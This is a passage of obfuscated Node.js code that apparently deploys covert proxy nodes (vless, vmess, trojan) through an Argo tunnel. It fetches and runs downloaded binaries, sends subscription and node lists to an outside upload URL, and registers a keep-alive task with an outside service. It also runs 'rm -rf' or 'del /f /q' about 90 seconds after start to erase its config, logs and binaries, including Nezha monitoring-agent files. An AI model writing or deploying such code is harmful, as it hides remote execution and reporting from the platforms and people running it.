_0x5c38ba['data'][_0x2b5cf6(_0x599220._0x49553b)]+'_'+_0x5c38ba[_0x2b5cf6(0x178)][_0x2b5cf6(_0x599220._0x2111ea)];}catch(_0x4478a5){}}return _0x2b5cf6(0x126);}async function _0x4467a9(_0x3e46b5){const _0x34358c=await _0x4e03ca(),_0x48830b=NAME?NAME+'-'+_0x34358c:_0x34358c;return new Promise(_0x12545d=>{const _0xd8a7c4={_0x140329:0x17d,_0x42e41c:0x141,_0xfd044f:0x1be,_0x5d9d2c:0x1b2,_0x4a5d7f:0x15d,_0x5b876a:0x18d,_0x41a8fe:0x161,_0x17fb79:0x1cc,_0x77353b:0x15d,_0x36ea5a:0x161,_0x2d5694:0x189},_0x2339c8={_0x293e31:0x1cc,_0x376e8e:0x19a};setTimeout(()=>{const _0x7a0e4=_0x4cc3,_0x501472={'v':'2','ps':''+_0x48830b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x7a0e4(_0xd8a7c4._0x140329),'net':'ws','type':'none','host':_0x3e46b5,'path':_0x7a0e4(_0xd8a7c4._0x42e41c),'tls':_0x7a0e4(0x12d),'sni':_0x3e46b5,'alpn':'','fp':_0x7a0e4(0x160)},_0x476134='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x7a0e4(_0xd8a7c4._0xfd044f)+_0x3e46b5+_0x7a0e4(_0xd8a7c4._0x5d9d2c)+_0x3e46b5+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x48830b+_0x7a0e4(0x1c1)+Buffer[_0x7a0e4(0x17c)](JSON[_0x7a0e4(0x120)](_0x501472))[_0x7a0e4(0x1cc)](_0x7a0e4(_0xd8a7c4._0x4a5d7f))+_0x7a0e4(0x173)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3e46b5+_0x7a0e4(_0xd8a7c4._0x5d9d2c)+_0x3e46b5+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x48830b+_0x7a0e4(_0xd8a7c4._0x5b876a);console[_0x7a0e4(_0xd8a7c4._0x41a8fe)](Buffer[_0x7a0e4(0x17c)](_0x476134)['toString'](_0x7a0e4(0x15d))),fs[_0x7a0e4(0x168)](subPath,Buffer[_0x7a0e4(0x17c)](_0x476134)[_0x7a0e4(_0xd8a7c4._0x17fb79)](_0x7a0e4(_0xd8a7c4._0x77353b))),console[_0x7a0e4(_0xd8a7c4._0x36ea5a)](FILE_PATH+_0x7a0e4(0x137)),uploadNodes(),app[_0x7a0e4(_0xd8a7c4._0x2d5694)]('/'+SUB_PATH,(_0x47216b,_0x4b925a)=>{const _0x310414=_0x7a0e4,_0x2d2d56=Buffer['from'](_0x476134)[_0x310414(_0x2339c8._0x293e31)](_0x310414(0x15d));_0x4b925a['set']('Content-Type',_0x310414(0x16c)),_0x4b925a[_0x310414(_0x2339c8._0x376e8e)](_0x2d2d56);}),_0x12545d(_0x476134);},0x7d0);});}}async function uploadNodes(){const _0x17f328={_0x3054d1:0x162,_0x209935:0x1cb,_0x2452d4:0x1b3,_0x46aca1:0x130,_0x15c27d:0x159,_0x43a1d7:0x1a5,_0x1e590e:0x11b,_0x4df8df:0x175,_0x37cc55:0x184,_0x29aa9f:0x164},_0x3221f4=_0x24753d;if(UPLOAD_URL&&PROJECT_URL){const _0x13d478=PROJECT_URL+'/'+SUB_PATH,_0x50077a={'subscription':[_0x13d478]};try{const _0x5cb1de=await axios[_0x3221f4(_0x17f328._0x3054d1)](UPLOAD_URL+_0x3221f4(_0x17f328._0x209935),_0x50077a,{'headers':{'Content-Type':_0x3221f4(_0x17f328._0x2452d4)}});return _0x5cb1de&&_0x5cb1de[_0x3221f4(0x164)]===0xc8?(console['log'](_0x3221f4(_0x17f328._0x46aca1)),_0x5cb1de):null;}catch(_0x4ba946){if(_0x4ba946[_0x3221f4(0x159)]){if(_0x4ba946[_0x3221f4(_0x17f328._0x15c27d)][_0x3221f4(0x164)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3221f4(0x125)](listPath))return;const _0x499251=fs[_0x3221f4(_0x17f328._0x43a1d7)](listPath,_0x3221f4(_0x17f328._0x1e590e)),_0x2c2663=_0x499251['split']('\x0a')[_0x3221f4(_0x17f328._0x4df8df)](_0x34a108=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3221f4(0x122)](_0x34a108));if(_0x2c2663[_0x3221f4(0x127)]===0x0)return;const _0x3d9104=JSON[_0x3221f4(0x120)]({'nodes':_0x2c2663});try{const _0x40f239=await axios[_0x3221f4(0x162)](UPLOAD_URL+_0x3221f4(_0x17f328._0x37cc55),_0x3d9104,{'headers':{'Content-Type':_0x3221f4(_0x17f328._0x2452d4)}});return _0x40f239&&_0x40f239[_0x3221f4(_0x17f328._0x29aa9f)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x40f239):null;}catch(_0x5630f3){return null;}}else return;}}function cleanFiles(){const _0x4365e2={_0x56a9b8:0x1b7,_0x4712c4:0x12e,_0x3d2d77:0x18f,_0x2663c3:0x1ce},_0x39ac28={_0x16d66f:0x1c9};setTimeout(()=>{const _0x3daea7={_0x3a91a2:0x1c9,_0x2ab37d:0x161,_0x313a2e:0x16e,_0x3bb6b8:0x142},_0x139a8b=_0x4cc3,_0xc26f31=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xc26f31[_0x139a8b(_0x4365e2._0x56a9b8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xc26f31[_0x139a8b(0x1b7)](phpPath);process[_0x139a8b(0x1b8)]===_0x139a8b(_0x4365e2._0x4712c4)?exec('del\x20/f\x20/q\x20'+_0xc26f31[_0x139a8b(_0x4365e2._0x3d2d77)]('\x20')+_0x139a8b(_0x4365e2._0x2663c3),_0xcf9aec=>{const _0x19cf1a=_0x139a8b;console[_0x19cf1a(_0x3daea7._0x3a91a2)](),console[_0x19cf1a(_0x3daea7._0x2ab37d)](_0x19cf1a(_0x3daea7._0x313a2e)),console[_0x19cf1a(_0x3daea7._0x2ab37d)](_0x19cf1a(_0x3daea7._0x3bb6b8));}):exec('rm\x20-rf\x20'+_0xc26f31[_0x139a8b(0x18f)]('\x20')+_0x139a8b(0x179),_0x2565ac=>{const _0x55eccd=_0x139a8b;console[_0x55eccd(_0x39ac28._0x16d66f)](),console[_0x55eccd(0x161)](_0x55eccd(0x16e)),console['log'](_0x55eccd(0x142));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x49c35b={_0x2a1a70:0x1a7,_0x27c637:0x19d,_0x155bd5:0x161},_0x15b3be=_0x24753d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x15b3be(0x161)](_0x15b3be(_0x49c35b._0x2a1a70));return;}try{const _0x36ba90=await axios['post'](_0x15b3be(_0x49c35b._0x27c637),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x15b3be(0x1b3)}});return console[_0x15b3be(_0x49c35b._0x155bd5)]('automatic\x20access\x20task\x20added\x20successfully'),_0x36ba90;}catch(_0x4d2a39){return console[_0x15b3be(0x187)](_0x15b3be(0x197)+_0x4d2a39[_0x15b3be(0x1af)]),null;}}async function startserver(){const _0x5e3d10={_0x24e544:0x187},_0x457548=_0x24753d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x17da78){console[_0x457548(_0x5e3d10._0x24e544)](_0x457548(0x1bc),_0x17da78);}}startserver()[_0x24753d(0x156)](_0x2177f4=>{const _0x42c0f1=_0x24753d;console[_0x42c0f1(0x187)]('Unhandled\x20error\x20in\x20startserver:',_0x2177f4);}),app[_0x24753d(0x129)](PORT,()=>console[_0x24753d(0x161)](_0x24753d(0x18e)+PORT+'!'));
